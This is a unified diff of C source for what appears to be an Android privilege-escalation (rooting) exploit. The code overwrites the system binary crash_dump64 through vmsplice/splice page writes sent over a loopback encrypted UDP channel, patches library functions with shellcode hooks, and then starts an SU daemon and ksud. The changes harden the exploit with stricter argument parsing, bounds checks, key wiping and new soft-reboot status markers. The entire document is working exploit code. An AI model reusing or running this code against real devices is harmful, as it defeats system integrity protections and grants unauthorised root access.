@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <ctype.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
@@ -17,8 +18,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
-
-#define eos(s) (s + strlen(s))
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -96,6 +95,9 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
                 [1] = "open vendor file failed or read returned < 16 bytes",
                 [2] = "write to pipe returned < 16 bytes",
                 [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
+                /* These are crash_dump64/splicehelper exit codes only (0..3).
+                 * rc=4 is reported by the App's marker domain, not a helper
+                 * exit code; it is never part of this table. */
             };
             int ec = WEXITSTATUS(status);
             const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
@@ -126,7 +128,10 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
     memcpy(hdr + 8, iv, 16);
 
     struct iovec iov = {.iov_base = hdr, .iov_len = 24};
-    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
+    /* hdr is a stack buffer: SPLICE_F_GIFT would promise the pages are never
+     * modified again, which is false here. A normal vmsplice already pins the
+     * pages for the splice into the UDP socket. */
+    if (vmsplice(pipe_wr, &iov, 1, 0) != 24) {
         printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
     }
 
@@ -171,8 +176,15 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         .sin_port   = htons((uint16_t)g_sender_port),
         .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
     };
-    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
+    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0) {
+        /* Fail loud: a bind failure means the UDP channel is broken. Java
+         * closes its DatagramSocket before native binds the same port (a
+         * small race), so in the controlled environment this should succeed;
+         * if it does not, continuing would only send packets to nowhere. */
         printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
+        close(sk_send);
+        return -1;
+    }
     struct sockaddr_in dst = {
         .sin_family = AF_INET,
         .sin_port   = htons((uint16_t)g_encap_port),
@@ -275,22 +287,40 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
 
 static int read_device_versions(int *andr, int *major, int *minor) {
     struct utsname u;
+    /* Kept at function scope: m = release below is used after the if-block,
+     * so a block-scoped release[] would be a dangling pointer (UB). */
+    char vendor_ver[5] = {0};
+    char release[15];
     if (uname(&u) != 0) return -1;
     if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
     const char *m = strstr(u.release, "android");
     if (!m) {
         printf("uname -r is missing Android version, trying getprop\n");
 
-        char vendor_ver[5];
-        char release[15];
-
-        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
-        fgets(vendor_ver, sizeof(vendor_ver), f);
-        pclose(f);
-
-        sprintf(release, "android");
-        sprintf(eos(release), "%s", vendor_ver);
-
+        /* Vendor kernel tags can be frozen at an older Android release while
+         * the OS has been upgraded; fall back to the generic property. */
+        static const char *const props[] = {
+            "ro.vendor.build.version.release",
+            "ro.build.version.release",
+        };
+        int got = 0;
+        for (size_t i = 0; i < sizeof(props) / sizeof(props[0]); i++) {
+            char cmd[80];
+            snprintf(cmd, sizeof(cmd), "getprop %s", props[i]);
+            FILE *f = popen(cmd, "r");
+            if (!f) continue;
+            if (fgets(vendor_ver, sizeof(vendor_ver), f) != NULL) {
+                pclose(f);
+                got = 1;
+                break;
+            }
+            pclose(f);
+        }
+        if (!got) {
+            printf("getprop failed to read Android version\n");
+            return -1;
+        }
+        snprintf(release, sizeof(release), "android%s", vendor_ver);
         m = release;
     }
     *andr = atoi(m + 7);
@@ -318,15 +348,25 @@ static int patch_helper(void) {
 
     uint8_t verify[16];
     int vfd = open(kCrashDump, O_RDONLY);
-    if (vfd >= 0) {
-        ssize_t n = pread(vfd, verify, 16, 16);
-        close(vfd);
-        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
-            printf("patch: crash_dump64 verification failed\n");
-            printf("patch: DEVICE NOT VULNERABLE\n");
-            free(buf);
-            return -1;
-        }
+    if (vfd < 0) {
+        printf("patch: crash_dump64 verification open failed: %s\n", strerror(errno));
+        printf("patch: DEVICE NOT VULNERABLE\n");
+        free(buf);
+        return -1;
+    }
+    ssize_t n = pread(vfd, verify, 16, 16);
+    close(vfd);
+    if (n != 16) {
+        printf("patch: crash_dump64 verification read failed: %s\n", strerror(errno));
+        printf("patch: DEVICE NOT VULNERABLE\n");
+        free(buf);
+        return -1;
+    }
+    if (memcmp(verify, buf + 16, 16) != 0) {
+        printf("patch: crash_dump64 verification failed\n");
+        printf("patch: DEVICE NOT VULNERABLE\n");
+        free(buf);
+        return -1;
     }
     free(buf);
     return 0;
@@ -420,6 +460,12 @@ static int patch_hook(const char *lib, const char *sym,
     if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
 
     int pos = (int)(hook_off & 15);
+    if (pos > 12) {
+        /* A 4-byte branch must fit inside the 16-byte trampoline block. */
+        printf("patch: %s hook at 0x%lx leaves only %d bytes in trampoline block\n",
+               lib, (unsigned long)hook_off, 16 - pos);
+        return -1;
+    }
     uint8_t blk[16];
     memcpy(blk, restore->tramp_orig, 16);
     memcpy(&blk[pos], &hook_insn, 4);
@@ -450,15 +496,23 @@ static const char *detect_ko_target(void) {
         if (access(candidates[i], F_OK) == 0)
             return candidates[i];
     }
-    return candidates[0];
+    return NULL;
+}
+
+/* Caller has already validated both characters with isxdigit(). */
+static int hex_nibble(unsigned char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    return c - 'A' + 10;
 }
 
 static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
     if (strlen(hex) != len * 2) return -1;
     for (size_t i = 0; i < len; i++) {
-        unsigned int b;
-        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
-        out[i] = (uint8_t)b;
+        unsigned char hi = (unsigned char)hex[i * 2];
+        unsigned char lo = (unsigned char)hex[i * 2 + 1];
+        if (!isxdigit(hi) || !isxdigit(lo)) return -1;
+        out[i] = (uint8_t)((hex_nibble(hi) << 4) | hex_nibble(lo));
     }
     return 0;
 }
@@ -466,6 +520,33 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 static void usage(const char *argv0) {
     fprintf(stderr,
             "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+}
+
+/* Bionic at minSdk 32 provides neither explicit_bzero() nor memset_s();
+ * writing through a volatile pointer keeps the wipe from being optimized out. */
+static void clear_secret(void *p, size_t n) {
+    volatile unsigned char *v = (volatile unsigned char *)p;
+    while (n--) *v++ = 0;
+}
+
+static int parse_port(const char *s, int *out) {
+    char *end;
+    errno = 0;
+    unsigned long v = strtoul(s, &end, 10);
+    if (errno == ERANGE || end == s || *end != '\0' || v < 1 || v > 65535)
+        return -1;
+    *out = (int)v;
+    return 0;
+}
+
+static int parse_spi(const char *s, uint32_t *out) {
+    char *end;
+    errno = 0;
+    unsigned long v = strtoul(s, &end, 0);
+    if (errno == ERANGE || end == s || *end != '\0' || v == 0 || v > UINT32_MAX)
+        return -1;
+    *out = (uint32_t)v;
+    return 0;
 }
 
 static int setup(int argc, char **argv) {
@@ -476,15 +557,23 @@ static int setup(int argc, char **argv) {
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
-        if (!strcmp(a, "--encap-port") && i + 1 < argc)
-            encap_port = atoi(argv[++i]);
-        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
-            sender_port = atoi(argv[++i]);
-        else if (!strcmp(a, "--spi") && i + 1 < argc)
-            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
-        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
-            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
-        else { usage(argv[0]); return 2; }
+        if (!strcmp(a, "--encap-port") && i + 1 < argc) {
+            if (parse_port(argv[++i], &encap_port)) { usage(argv[0]); return 2; }
+        } else if (!strcmp(a, "--sender-port") && i + 1 < argc) {
+            if (parse_port(argv[++i], &sender_port)) { usage(argv[0]); return 2; }
+        } else if (!strcmp(a, "--spi") && i + 1 < argc) {
+            if (parse_spi(argv[++i], &spi)) { usage(argv[0]); return 2; }
+        } else if (!strcmp(a, "--aes-key") && i + 1 < argc) {
+            /* Residual risk: the key is still passed as argv (visible in
+             * /proc/<pid>/cmdline). Java branch 2 is unchanged to avoid a
+             * cross-branch conflict; a full fix needs Java to hand the key
+             * over via fd/pipe and native to read it there. The CLI format
+             * stays unchanged so that contract is not broken. */
+            if (hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) != 0) {
+                usage(argv[0]); return 2;
+            }
+            have_aes = 1;
+        } else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
         usage(argv[0]); return 2;
@@ -495,8 +584,13 @@ static int setup(int argc, char **argv) {
     g_spi         = spi;
     g_seq         = 1;
     memcpy(g_aes_key, aes_key, 32);
+    clear_secret(aes_key, sizeof(aes_key));
 
     const char *ko_target = detect_ko_target();
+    if (!ko_target) {
+        printf("no KO target exists; expected /vendor/lib64/AIAwbModel_v2.2.tflite\n");
+        return 2;
+    }
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
     strncpy(libcxx_ko_target, ko_target, 63);
     libcxx_ko_target[63] = '\0';
@@ -549,7 +643,19 @@ static int exploit(void) {
         { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
         { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
         { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
+        /* ORDER IS CRITICAL: dfmsr (rc=4) must precede dfm6 (rc=0) in this
+         * table. The poll loop below scans entries in array order and stops
+         * at the first terminal marker, so with soft-reboot enabled both
+         * files exist but dfmsr wins and the App is told SOFT REBOOT PENDING
+         * instead of SUCCESS. With soft-reboot disabled dfmsr is absent and
+         * the original dfm6 -> rc=0 path is unchanged. */
+        { "/dev/dfmsr", "ksud start: SOFT REBOOT PENDING (root active)",     4 },
         { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
+        /* Warning markers: informational only (rc=-1), never change rc.
+         * dfmw2 = late-load wait timed out, soft-reboot skipped (root active).
+         * dfmw3 = ksud soft-reboot command failed (root still active). */
+        { "/dev/dfmw2", "bootstrap: WARNING - late-load wait timed out, soft-reboot skipped (root active)", -1 },
+        { "/dev/dfmw3", "bootstrap: WARNING - ksud soft-reboot command failed (root active)", -1 },
         { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
